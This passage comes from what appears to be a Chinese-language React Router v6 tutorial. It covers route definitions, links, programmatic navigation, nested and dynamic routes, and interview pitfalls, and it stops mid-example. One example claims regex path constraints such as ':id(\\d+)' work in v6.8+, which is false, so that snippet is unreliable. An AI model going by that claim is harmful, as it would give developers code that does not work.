class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      &#123;/* 基础路由 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">HomePage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 动态路由 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/users/:id&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserDetail</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 嵌套路由 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/dashboard&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardLayout</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardHome</span> /&gt;</span>&#125; /&gt; &#123;/* index 路由 */&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;settings&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">SettingsPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 404 路由 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">NotFoundPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>&lt;Routes&gt;</code>：<ul><li>路由匹配容器，替代 v5 的 <Switch></li><li>自动选择最佳匹配的路由（不再按顺序匹配）</li></ul></li><li><code>&lt;Route&gt;</code> 关键属性：<ul><li>path：URL 匹配规则（支持 :id 动态参数）</li><li>element：匹配时渲染的组件（必须是 React 元素，如 <Component />）</li><li>index：标识默认子路由（当父路由匹配时渲染）</li></ul></li></ul><p><strong><code>&lt;Link&gt;</code> 与 <code>&lt;NavLink&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Link</span>, <span class="hljs-title class_">NavLink</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-comment">// 基础链接</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>关于我们<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br><br><span class="hljs-comment">// 带状态的导航</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/users/123&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">fromDashboard:</span> <span class="hljs-attr">true</span> &#125;&#125;  // <span class="hljs-attr">传递状态</span></span></span><br><span class="hljs-tag"><span class="language-xml">&gt;</span></span><br><span class="language-xml">  用户详情</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br><br><span class="hljs-comment">// 活动链接样式</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/dashboard&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;(&#123;</span> <span class="hljs-attr">isActive</span> &#125;) =&gt;</span> (&#123; </span><br><span class="language-xml">    color: isActive ? &#x27;red&#x27; : &#x27;blue&#x27; </span><br><span class="language-xml">  &#125;)&#125;</span><br><span class="language-xml">  end  // 精确匹配（v6 新特性）</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  控制台</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;Link&gt;</code>：<ul><li>声明式导航组件，渲染为 <code>&lt;a&gt;</code> 标签</li><li>to 属性支持字符串&#x2F;对象（可包含 pathname, search, hash, state）</li></ul></li><li><code>&lt;NavLink&gt;</code>：<ul><li>增强版 <code>&lt;Link&gt;</code>，可添加活动状态样式</li><li>isActive 标志当前是否匹配</li><li>end 属性确保精确匹配（避免父路由激活时子路由也被激活）</li></ul></li></ul><h3 id="基础路由配置模式"><a href="#基础路由配置模式" class="headerlink" title="基础路由配置模式"></a>基础路由配置模式</h3><p><strong>集中式配置（推荐）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// routes.js</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Home</span> /&gt;</span></span> &#125;,<br>  &#123; <br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/products&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">index</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductList</span> /&gt;</span></span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductDetail</span> /&gt;</span></span> &#125;<br>    ]<br>  &#125;<br>];<br><br><span class="hljs-comment">// App.js</span><br><span class="hljs-keyword">import</span> &#123; useRoutes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useRoutes</span>(routes);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>编程式导航</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useNavigate &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">login</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// 跳转并替换历史记录（不可回退）</span><br>      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/dashboard&#x27;</span>, &#123; <span class="hljs-attr">replace</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">state</span>: &#123; user &#125; &#125;);<br>    &#125;);<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleLogin&#125;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>useNavigate() 返回导航函数</li><li>参数选项：<ul><li>replace: true 替换当前历史记录</li><li>state 传递路由状态（可通过 useLocation() 获取）</li></ul></li></ul><h3 id="面试高频问题与踩坑点"><a href="#面试高频问题与踩坑点" class="headerlink" title="面试高频问题与踩坑点"></a>面试高频问题与踩坑点</h3><p><strong>BrowserRouter 的服务器配置问题</strong></p><p>问题：直接访问 &#x2F;dashboard 路由出现 404</p><p>解决方案：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx 配置</span><br><span class="hljs-section">location</span> / &#123;<br>  <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.html;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>v5 到 v6 的重大变化</strong></p><ul><li>废除 <code>&lt;Switch&gt;</code> → 改用 <code>&lt;Routes&gt;</code></li><li>废除 component&#x3D;{Component} → 改用 <code>element=&#123;&lt;Component /&gt;&#125;</code></li><li>废除 exact 属性 → 路径匹配规则变更（默认部分匹配）</li><li>嵌套路由必须使用 <code>&lt;Outlet&gt;</code> 作为占位符</li></ul><p><strong>动态路由参数获取</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useParams &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserDetail</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = <span class="hljs-title function_">useParams</span>();  <span class="hljs-comment">// 获取 :id 参数</span><br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>路由状态传递与获取</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 发送方</span><br>&lt;<span class="hljs-title class_">Link</span> to=<span class="hljs-string">&quot;/profile&quot;</span> state=&#123;&#123; <span class="hljs-attr">fromHome</span>: <span class="hljs-literal">true</span> &#125;&#125; /&gt;<br><br><span class="hljs-comment">// 接收方</span><br><span class="hljs-keyword">import</span> &#123; useLocation &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(location.<span class="hljs-property">state</span>?.<span class="hljs-property">fromHome</span>); <span class="hljs-comment">// true</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>&lt;NavLink&gt;</code> 精确匹配问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误：/dashboard/settings 会同时激活两个链接</span><br>&lt;<span class="hljs-title class_">NavLink</span> to=<span class="hljs-string">&quot;/dashboard&quot;</span>&gt;控制台&lt;/<span class="hljs-title class_">NavLink</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/dashboard/settings&quot;</span>&gt;</span>设置<span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br><br><span class="hljs-comment">// 正确：父链接添加 end 属性</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/dashboard&quot;</span> <span class="hljs-attr">end</span>&gt;</span>控制台<span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>路由鉴权基础模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 高阶组件示例</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">PrivateRoute</span> = (<span class="hljs-params">&#123; children &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">return</span> user ? children : <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> /&gt;</span></span>;<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/admin&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">PrivateRoute</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">PrivateRoute</span>&gt;</span></span><br><span class="language-xml">  &#125;</span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="核心总结"><a href="#核心总结" class="headerlink" title="核心总结"></a>核心总结</h3><ul><li>路由三件套：<ul><li><code>&lt;BrowserRouter&gt;</code> 提供路由上下文</li><li><code>&lt;Routes&gt;</code> + <code>&lt;Route&gt;</code> 定义路由规则</li><li><code>&lt;Link&gt;</code>&#x2F;<code>&lt;NavLink&gt;</code> 实现声明式导航</li></ul></li><li>v6 核心变化：<ul><li>路由配置从 component 改为 element</li><li>嵌套路由使用 <code>&lt;Outlet&gt;</code> 作为渲染出口</li><li>匹配规则优化（自动选择最佳匹配）</li></ul></li><li>面试必考：<ul><li>动态路由参数获取（useParams）</li><li>编程式导航（useNavigate）</li><li>路由守卫实现方案</li><li>v5 到 v6 的迁移问题</li></ul></li></ul><h2 id="6-2-动态路由与嵌套路由"><a href="#6-2-动态路由与嵌套路由" class="headerlink" title="6.2 动态路由与嵌套路由"></a>6.2 动态路由与嵌套路由</h2><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p><strong>动态路由</strong></p><ul><li>定义：路径中包含参数的路由（如 &#x2F;users&#x2F;:id）</li><li>核心价值：<ul><li>创建可复用的视图模板</li><li>根据URL参数动态加载数据</li><li>实现SEO友好的URL结构</li></ul></li></ul><p><strong>嵌套路由</strong></p><ul><li>定义：路由之间的父子层级关系</li><li>核心价值：<ul><li>实现布局复用（共享header&#x2F;sidebar）</li><li>组织复杂的应用结构</li><li>保持局部UI状态（仅更新子路由区域）</li></ul></li></ul><h3 id="动态路由深度解析"><a href="#动态路由深度解析" class="headerlink" title="动态路由深度解析"></a>动态路由深度解析</h3><p><strong>基础实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由配置</span><br>&lt;<span class="hljs-title class_">Routes</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/products/:productId&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProductDetail</span> /&gt;</span>&#125; /&gt;</span><br>&lt;/<span class="hljs-title class_">Routes</span>&gt;<br><br><span class="hljs-comment">// 组件内获取参数</span><br><span class="hljs-keyword">import</span> &#123; useParams &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductDetail</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; productId &#125; = <span class="hljs-title function_">useParams</span>(); <span class="hljs-comment">// 获取动态参数</span><br>  <span class="hljs-comment">// 使用 productId 加载数据...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>高级匹配模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 多参数路由</span><br>&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">&quot;/category/:categoryId/product/:productId&quot;</span> /&gt;<br><br><span class="hljs-comment">// 可选参数</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/search/:keyword?/:filter?&quot;</span> /&gt;</span></span><br><br><span class="hljs-comment">// 正则约束 (v6.8+)</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/user/:id(\\d+)&quot;</span> // <span class="hljs-attr">只匹配数字ID</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserProfile</span> /&gt;</span>&#125; </span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>数据加载模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Router v6.4+ 数据路由</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;products/:id&quot;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-title function_">async</span> (&#123; params &#125;) =&gt; &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/products/<span class="hljs-subst">$&#123;params.id&#125;</span>`</span>); <span class="hljs-comment">// 预加载数据</span><br>    &#125;,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">index</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductOverview</span> /&gt;</span></span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;reviews&quot;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductReviews</span> /&gt;</span></span> &#125;<br>    ]<br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><h3 id="嵌套路由深度解析"><a href="#嵌套路由深度解析" class="headerlink" title="嵌套路由深度解析"></a>嵌套路由深度解析</h3><p><strong>基础嵌套结构</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">Routes</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;dashboard&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardLayout</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardHome</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;analytics&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AnalyticsPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;settings&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">SettingsPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Routes</span>&gt;<br><br><span class="hljs-comment">// DashboardLayout.jsx</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Outlet</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DashboardLayout</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;dashboard&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Sidebar</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span> &#123;/* 子路由渲染位置 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>多级嵌套实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">&quot;admin&quot;</span> element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminLayout</span> /&gt;</span></span>&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AdminDashboard</span> /&gt;</span>&#125; /&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;users&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserManagementLayout</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserList</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;:userId&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserDetail</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Route</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>布局路由模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建共享布局组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MainLayout</span>(<span 